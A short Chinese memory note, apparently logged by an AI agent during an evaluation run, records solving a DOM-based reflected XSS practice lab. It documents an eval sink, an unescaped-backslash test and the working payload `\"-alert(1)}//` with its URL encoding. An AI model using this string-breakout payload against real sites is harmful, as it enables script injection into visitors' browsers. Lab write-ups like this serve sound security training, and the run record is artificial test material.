---
metadata:
  node_type: memory
name: "PRS arm A lab-dom-xss-reflected"
description: "arm A 基线:lab-dom-xss-reflected 冷实例一次通过 - 反斜杠未转义破 JSON 串,eval sink 触发 alert(1),banner solved"
last_updated: 2026-10-09T00:47:11+08:00
created: 2026-10-09T00:47:11+08:00
---

## 2026-10-09 — arm A baseline: lab-dom-xss-reflected

冷实例(reused:false)一次通过,无 exploit server,浏览器内 alert 即判 solved。

链路:page_read 取 widget-lab-id(954173de…)→ range_launch(jar /tmp/cj1.json)→ 首页 http_dump 见 `/?search=` 表单,搜索页内联 `search('search-results')` + `/resources/js/searchResults.js`。

Sink(xhr.onreadystatechange 内):`eval('var searchResultsObj = ' + this.responseText)`,responseText 来自 `/search-results?search=<term>`,服务端把 term 回填进 JSON 尾字段 `"searchTerm":"<term>"`。

逃逸面实测(两条对照,body_len 32 基线):
- `a"b` → body_len 34,引号被转成 `\"`(标准 JSON 转义);
- `a\b` → body_len 33,反斜杠原样透传、未转义。
⇒ 提交 `\"` 后服务端输出 `\\"`,JS 里反斜杠被吃、引号成功闭合字符串。

载荷:`\"-alert(1)}//`(URL 编码 `%5c%22-alert(1)%7d%2f%2f`),即 `/?search=…`。
eval 后:`{"results":[],"searchTerm":"\\"-alert(1)}//"}` → 对象字面量求值过程中调用 alert(1),`}` 收对象,`//` 吃掉尾部 `"}`。

判读:page_alert(fired=true, alerts=["alert:1"])→ banner_verdict solved=true / congrats 行。

坑:无。件够用(page_read/range_launch/http_dump/page_alert/banner_verdict)。区分转义行为的办法就是同一端点两条对照请求比 body_len,比读预览可靠。

